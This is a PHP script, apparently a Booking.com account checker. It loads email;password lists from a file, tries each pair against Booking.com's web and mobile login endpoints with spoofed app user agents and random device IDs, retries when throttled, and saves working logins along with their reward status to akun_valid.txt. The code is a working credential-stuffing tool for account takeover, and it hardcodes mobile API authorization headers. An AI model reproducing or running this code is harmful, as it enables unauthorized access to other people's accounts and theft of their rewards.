<?php
/**	
 * @author eco.nxn
 */
date_default_timezone_set("Asia/Jakarta");
error_reporting(0);
class curl {
	private $ch, $result, $error;
	
	/**	
	 * HTTP request
	 * 
	 * @param string $method HTTP request method
	 * @param string $url API request URL
	 * @param array $param API request data
     * @param array $header API request header
	 */
	public function request ($method, $url, $param, $header) {
		curl:
        $this->ch = curl_init();
        switch ($method){
            case "GET":
                curl_setopt($this->ch, CURLOPT_POST, false);
                break;
            case "POST":               
                curl_setopt($this->ch, CURLOPT_POST, true);
                curl_setopt($this->ch, CURLOPT_POSTFIELDS, $param);
                break;
            case "PATCH":               
                curl_setopt($this->ch, CURLOPT_CUSTOMREQUEST, "PATCH");
                curl_setopt($this->ch, CURLOPT_POSTFIELDS, $param); 
                break;
        }
        curl_setopt($this->ch, CURLOPT_URL, $url);
        if(is_numeric(strpos($url, 'account.booking.com'))) {
            curl_setopt($this->ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0');
        } else {
            curl_setopt($this->ch, CURLOPT_USERAGENT, 'Booking.App/22.9 Android/9; Type: mobile; AppStore: google; Brand: xiaomi; Model: Redmi Note '.rand(1,8).';');
        }
        curl_setopt($this->ch, CURLOPT_HEADER, false);
        curl_setopt($this->ch, CURLOPT_HTTPHEADER, $header);
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($this->ch, CURLOPT_CONNECTTIMEOUT, 10);
        // curl_setopt($this->ch, CURLOPT_VERBOSE, 1);
        curl_setopt($this->ch, CURLOPT_TIMEOUT, 20);
        $this->result = curl_exec($this->ch);
        $this->error = curl_error($this->ch);
        if($this->error) {
            echo "(!) Connection Timeout\n";
            sleep(3);
            goto curl;
        }
        curl_close($this->ch);
        return $this->result;
    }   
}

class bookingcom extends curl{

    function random($length)
    {
        $data = 'qwertyuioplkjhgfdsazxcvbnm0123456789';
        $string = '';
        for($i = 0; $i < $length; $i++) {
            $pos = rand(0, strlen($data)-1);
            $string .= $data{$pos};
        }
        return $string;
    }

    function uuid(){
        $data = random_bytes(16);
        $data[6] = chr(ord($data[6]) & 0x0f | 0x40); 
        $data[8] = chr(ord($data[8]) & 0x3f | 0x80); 
        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
    }

    function check($email, $password, $client_id) { 

        $method   = 'POST';
        $header[] = 'Content-Type: application/json';
        $header[] = 'X-Requested-With: XMLHttpRequest';
        $endpoint = 'https://account.booking.com/account/sign-in/password';
        
        $param = '{
            "login_name": "'.$email.'",
            "password": "'.$password.'",
            "client_id": "'.$client_id.'",
            "state": "",
            "scope": "",
            "code_challenge": "",
            "code_challenge_method": "",
            "op_token": "EgVvYXV0aCKNBQoUdk8xS2Jsazd4WDl0VW4yY3BaTFMSCWF1dGhvcml6ZRo1aHR0cHM6Ly9zZWN1cmUuYm9va2luZy5jb20vbG9naW4uaHRtbD9vcD1vYXV0aF9yZXR1cm4qrARVcDREUFZVbGQ4MUFaZU1mb2NFdFBSelhYQzBkRG9mNVl5dmJWaG5lS0tadGhuYUhBRFNKT0U2MGtaRHRKcy1XRzVXSHFTaXR4QmZ1VVBYMy02X3lJNC1kTEoyV0hIWXNmcDZrLWFiMlNKRGltUE1DaTE2S0NrZjNQM3R6Q1lvejJBN0dGQTRva0pHM2NLeElDLVlUT21NQk1aSzUtVEpGWElUVDQwclZlOERZRWpxNGxXaUFVUXVlUlJaOUo2SmhCdDhGbWdETW9BaTAtU1JIdWdiVWg3NTlrSWhrcDVsc2tXSXBseXJDZ3dIaFhoLXB4WGVrZlFMWFNBSXd2Tllkd291VDhDQmlHTVA2MHBhV3lmdWlTZnhVWUlkV2lobkd2QlkwWTN2RWNraWRkci1JM2RHZDVrRC1sVHNQOU9kLUExX2ZjaEkwcFZSUkZjdUo0TnJTallJUVZkd2Q0eXJ4MjZXb3VOM1g1UE9MdjhEQ2lZRFJidW14alg2dFZfR0JnRl9XSHM3bGNjUVdWNFNrby1yR3Nzb19UYmlVNXRud1JuTUFNTm56LUUzaF91TmN0b3RYMm96b09RSEdnZFo2OVFMOEFZY25qS2t0anRjVklFRlBfNGgzY1ZqeHhUWnR6Ry1TZG5odk9RbU0yN21mR0ZLcjR4OUNFam55bnJqa3hZM20wd2pHdFg3TjV5aGQ4VkIxbDFLbktaTFVsSUtSM2dtcGVETm9JWG43QgRjb2RlKg4IjsgSOgBCAFiJzuz3BQ"
        }';
        
        $check = $this->request ($method, $endpoint, $param, $header); 

        $json = json_decode($check);
 
        return $json;       
    }

    function login_apk($email, $password, $device_id) {

        $method   = 'POST';

        $header[] = 'Cache-Control: no-cache';
        $header[] = 'Authorization: Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN';
        $header[] = 'X-LIBRARY: okhttp+network-api';
        $header[] = 'X-Booking-API-Version: 1';
        $header[] = 'B-T: AAAAAAAAAAA=fNd1KP3jttsTlKwTo8blsNzYgfdTKF9YNxfv4FkF35Df8TGoMhjky-ouTGGyfivOFhBDJ9aOTuZSsZRY0jCoEwF-_VllKhfCz3qjTW5o8Iz4xVp70eTJDuwJyLj_MeVJZslo0eafGFtHNMrp8lRn65-UCgUsSdhUXOL9o1VsN4MA9W67f0KfW7gXIMT3xyVCK3ae_mX1p-b3gfwPHikRgg0hLazmGqWCZsW1JcTRWLJSlkCFKd1NxfN7sWD1nphRSzmyFSwsF5hW-rBI00qxTGZtgNBuh7TRMycETQ';
        $header[] = 'Content-Type: application/x-gzip; contains="application/json"; charset=utf-8';
        $header[] = 'Host: secure-iphone-xml.booking.com';
        $header[] = 'Connection: Keep-Alive';
        $header[] = 'Accept-Encoding: gzip';


        $endpoint = 'https://secure-iphone-xml.booking.com/json/mobile.login?&user_os=9&user_version=22.9-android&device_id='.$device_id.'&network_type=wifi&languagecode=en-us&display=normal_xxhdpi&affiliate_id=337862';
        
        $param = '{
            "email": "'.$email.'",
            "password": "'.$password.'"
        }';

        $login = $this->request ($method, $endpoint, $param, $header);

        $json = json_decode($login);
 
        return $json;
    }

    function reward($device_id, $auth_token) {

        $method   = 'GET';

        $header[] = 'X-LIBRARY: okhttp+network-api';
        $header[] = 'Authorization: Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN';
        $header[] = 'X-Booking-API-Version: 1';
        $header[] = 'B-T: AAAAAAAAAAA=fNd1KP3jttsTlKwTo8blsNzYgfdTKF9YNxfv4FkF35Df8TGoMhjky-ouTGGyfivOFhBDJ9aOTuZSsZRY0jCoEwF-_VllKhfCz3qjTW5o8Iz4xVp70eTJDuwJyLj_MeVJZslo0eafGFtHNMrp8lRn65-UCgUsSdhUXOL9o1VsN4MA9W67f0KfW7gXIMT3xyVCK3ae_mX1p-b3gfwPHikRgg0hLazmGqWCZsW1JcTRWLJSlkCFKd1NxfN7sWD1nphRSzmyFSwsF5hW-rBI00qxTGZtgNBuh7TRMycETQ';
        $header[] = 'Host: mobile-apps.booking.com';
        $header[] = 'Connection: Keep-Alive';
        $header[] = 'Accept-Encoding: gzip';

        $endpoint = 'https://mobile-apps.booking.com/json/mobile.getRewards?supports_cta_actions=1&app_supports_gem_rewards=1&currency_code=IDR&user_os=9&user_version=22.9-android&device_id='.$device_id.'&network_type=wifi&auth_token='.$auth_token.'&languagecode=en-us&display=normal_xxhdpi&affiliate_id=337862';
        
        $reward = $this->request ($method, $endpoint, $param=NULL, $header); 

        $json = json_decode($reward);

        return $json;
    }
}

/**
 * Running
 */
$version = '1.5';
$update = file_get_contents('https://econxn.id/setset/turu.json');
$json = json_decode($update);
if($json->version != $version) {
    echo $json->msg;
    die();
}

// style 
echo "\n"; 
echo "   ___   ____   _____ ____   __  ___\n";
echo "  / _ ) / __ \ / ___// __ \ /  |/  /\n";
echo " / _  |/ /_/ // /__ / /_/ // /|_/ /\n"; 
echo "/____/ \____/ \___/ \____//_/  /_/\n";  
echo "Checker               by @eco.nxn\n";
start:
echo "\nPut your account in akun.txt (format: email;password)\n";

$bocom = new bookingcom();

echo "Enter...";
trim(fgets(STDIN));

$file = dirname(__FILE__)."/akun.txt";

$file2 = dirname(__FILE__)."/akun_valid.txt";
if(file_exists($file2)) {
    unlink($file2);
}

if(file_exists($file)) {
    $list = explode("\n",str_replace("\r","",file_get_contents($file)));
    
    $no=1;
    foreach ($list as $value) {

        if(!is_numeric(strpos($value, ';'))) {
            echo "[".$no++."] Format harus email;password\n\n";
            die();
        }

        $account = explode(";", $value);
        $email     = $account[0];
        $password  = $account[1];
        $client_id = $bocom->random(16);
        $device_id = $bocom->uuid();
        
        check:
        $check = $bocom->check($email, $password, $client_id);

        if($check->next_step == 'redirect') { 

            $re=0;
            login_apk:
            $login_apk = $bocom->login_apk($email, $password, $device_id);

            if(!isset($login_apk->auth_token)) {
                if(is_numeric(strpos($login_apk->message, 'Authentication token is invalid, please login.')) || $login_apk->message == 'AUTH_STATUS_FAILED' || $login_apk->message == 'AUTH_STATUS_TOKEN_ERROR') {
                    echo "[!] Tunggu dulu ada masalah..\n";
                    sleep(10);
                    $re++;
                    if ($re < 20) {
                        goto login_apk_;
                    }
                    $re=0;
                    echo "Skipp..try again later..\n";
                }
                
                echo "[".$no++."] ACTIVE - ".$email." Check Reward Later [".$login_apk->message."]\n";
                
                
            } else {
                $reward = $bocom->reward($device_id, $login_apk->auth_token);

                $rewarded  = $reward->data->programs[0]->groups[0]->rewards[0]->status->name;

                if($reward->data->programs == []) {
                    echo "[".$no++."] ACTIVE - ".$email." No Reward\n";
                } elseif(isset($rewarded)) {
                    echo "[".$no++."] ACTIVE - ".$email." ".$rewarded."\n";
                } else {
                    echo "[".$no++."] ACTIVE - ".$email." Check Reward Later\n";
                }
            }

            $fh = fopen($file2, "a");
            fwrite($fh, $email.";".$password.";ACTIVE;".$rewarded."\n");
            fclose($fh);
          
        } elseif ($check->next_step == '/account-disabled') {

            $re_=0;
            login_apk_:
            $login_apk = $bocom->login_apk($email, $password, $device_id);

            if(!isset($login_apk->auth_token)) {
                if(is_numeric(strpos($login_apk->message, 'Authentication token is invalid, please login.')) || $login_apk->message == 'AUTH_STATUS_FAILED' || $login_apk->message == 'AUTH_STATUS_TOKEN_ERROR') {
                    echo "[!] Tunggu dulu ada masalah..\n";
                    sleep(10);
                    $re_++;
                    if ($re_ < 20) {
                        goto login_apk_;
                    }
                    $re_=0;
                    echo "Skipp..try again later..\n";
                } 

                echo "[".$no++."] BANNED - ".$email." Check Reward Later [".$login_apk->message."]\n"; 

            } else {
                $reward = $bocom->reward($device_id, $login_apk->auth_token);

                $rewarded  = $reward->data->programs[0]->groups[0]->rewards[0]->status->name;

                if($reward->data->programs == []) {
                    echo "[".$no++."] BANNED - ".$email." No Reward\n";
                } elseif(isset($rewarded)) {
                    echo "[".$no++."] BANNED - ".$email." ".$rewarded."\n";
                } else {
                    echo "[".$no++."] BANNED - ".$email." Check Reward Later\n";
                }
            }

            $fh = fopen($file2, "a");
            fwrite($fh, $email.";".$password.";BANNED;".$rewarded."\n");
            fclose($fh);

        } elseif (isset($check->errors[0])) {
            echo "[".$no++."] ".$email." [".$check->errors[0]."] ERROR\n";  
        } else {
            echo "[!] UNKNOWN ERROR: ".$check."\n"; 
            sleep(2);
            goto check;
        }  
    }

    echo "\n(i) Your valid account has saved in akun_valid.txt\n\n";    

} else {
    goto start;
}
